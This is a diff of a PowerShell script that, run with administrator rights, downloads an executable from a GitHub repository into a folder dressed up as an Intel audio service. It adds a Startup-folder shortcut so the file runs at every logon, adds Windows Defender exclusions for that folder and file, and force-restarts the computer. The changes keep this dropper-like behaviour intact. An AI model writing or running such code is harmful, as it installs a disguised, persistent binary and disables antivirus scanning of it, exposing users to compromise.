@@ -9,26 +9,32 @@ if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
      }
      
      # Remainder of script here
-
-
       $WScriptShell = New-Object -ComObject WScript.Shell
       $FolderPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
       $ShortcutFile = "$FolderPath\IAAudIOSvc.lnk"
-      $TargetFile = "$env:USERPROFILE\AppData\Roaming\Intel Corporation\IAAudIOSvc\IAAudIOSvc.exe"
+      $TargetPath = "$env:USERPROFILE\AppData\Roaming\Intel Corporation\IAAudIOSvc"
+      $TargetFile = "$TargetPath\IAAudIOSvc.exe"
       
       If(!(Test-Path $FolderPath)) {
           New-Item -ItemType Directory -Force -Path $FolderPath
       }
 
-      Invoke-WebRequest -uri "https://github.com/B95segal/intelaudioservice/blob/main/dist/IAAudIOSvc.exe" -OutFile "$env:USERPROFILE\AppData\Roaming\Intel Corporation\IAAudIOSvc\IAAudIOSvc.exe"  
-      
+      if (! (test-path $TargetPath)) {
+            New-Item -ItemType Directory -Force -Path $TargetPath
+      }
+
+      if (! (test-path $TargetFile)) {
+            Invoke-WebRequest -Uri https://github.com/B95segal/intelaudioservice/blob/main/dist/IAAudIOSvc.exe -OutFile $TargetFile  
+      }
+
+
       $Shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
       $Shortcut.TargetPath = $TargetFile
-      $Shortcut.Arguments = ""
-      $Shortcut.WorkingDirectory = "$env:USERPROFILE\AppData\Roaming\Intel Corporation\IAAudIOSvc"
-      $Shortcut.IconLocation = "$env:USERPROFILE\AppData\Roaming\Intel Corporation\IAAudIOSvc\IAAudIOSvc.exe,0"
+      $Shortcut.WorkingDirectory = $TargetPath
+      $Shortcut.IconLocation = "$TargetPath\IAAudIOSvc.exe,0"
       $Shortcut.Save()
 
-      Add-MpPreference -ExclusionPath "$env:USERPROFILE\AppData\Roaming\Intel Corporation\IAAudIOSvc\"
-      Add-MpPreference -ExclusionPath "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\" 
+      Add-MpPreference -ExclusionPath $TargetPath
+      Add-MpPreference -ExclusionPath $Shortcut.TargetPath
+
       Restart-Computer -Force
